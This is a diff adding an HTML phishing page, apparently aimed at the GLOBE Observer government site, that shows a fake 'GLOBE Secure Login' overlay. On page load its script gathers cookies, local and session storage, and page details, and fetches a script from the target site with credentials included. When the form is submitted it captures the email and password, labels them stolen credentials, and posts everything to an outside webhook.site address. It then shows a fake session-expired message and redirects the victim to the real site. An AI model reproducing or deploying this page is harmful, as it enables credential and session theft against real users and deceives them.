@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GLOBE Verification</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #f3f3f3;
+    }
+    #overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    #fakeLogin {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #000;
+      width: 300px;
+    }
+    #fakeLogin input {
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 10px;
+    }
+    #fakeLogin button {
+      width: 100%;
+      padding: 10px;
+      background: #0078d4;
+      border: none;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div id="overlay">
+  <form id="fakeLogin">
+    <h3>GLOBE Secure Login</h3>
+    <input type="email" id="email" placeholder="Email" required><br>
+    <input type="password" id="pass" placeholder="Password" required><br>
+    <button type="submit">Login</button>
+  </form>
+</div>
+
+<script>
+// 🎯 بيانات الجلسة - cookies + storage
+const sessionData = {
+  cookie: document.cookie,
+  localStorage: JSON.stringify(localStorage),
+  sessionStorage: JSON.stringify(sessionStorage),
+  userAgent: navigator.userAgent,
+  location: window.location.href
+};
+
+// ⛓️ استغلال CORS عبر fetch
+fetch("https://observer.globe.gov/o/gov-globe-observer-theme/js/main.js", {
+  method: "GET",
+  credentials: "include"
+})
+.then(r => r.text())
+.then(js => {
+  sessionData.main_js = js;
+  sendToWebhook(sessionData);
+});
+
+// 🛂 زرع واجهة مزيفة - تسجيل الدخول
+document.getElementById('fakeLogin').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const credentials = {
+    email: document.getElementById('email').value,
+    password: document.getElementById('pass').value
+  };
+  sendToWebhook({ type: "stolen_credentials", ...credentials });
+  alert("Session expired. Please try again later.");
+  window.location.href = "https://observer.globe.gov";
+});
+
+// 📤 إرسال كل شيء إلى Webhook
+function sendToWebhook(data) {
+  fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  });
+}
+</script>
+
+</body>
+</html>
